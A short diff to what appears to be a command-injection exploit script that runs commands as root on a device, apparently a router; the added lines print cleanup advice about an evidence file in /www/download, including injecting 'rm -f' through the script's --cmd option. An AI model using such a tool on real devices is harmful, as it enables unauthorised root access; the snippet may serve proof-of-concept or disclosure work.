@@ -242,6 +242,12 @@ def main() -> int:
 
     if st == 200 and body.strip():
         print("\n[+] CONFIRMED: command executed as root.")
+        print(f"    The evidence file {OUT_PATH} is left in place so you can")
+        print("    inspect it. Note that file.write can only truncate, not delete;")
+        print("    remove it with:")
+        print(f"      --cmd 'rm -f {OUT_PATH}'   (the injected command runs as root,")
+        print("                                   so it can delete the file)")
+        print("    /www/download is on a ramfs, so it is also cleared by a reboot.")
         return 0
     print("\n[-] no output retrieved. If the command had no stdout, redirect it "
           "to a file and use --show to read it back.")
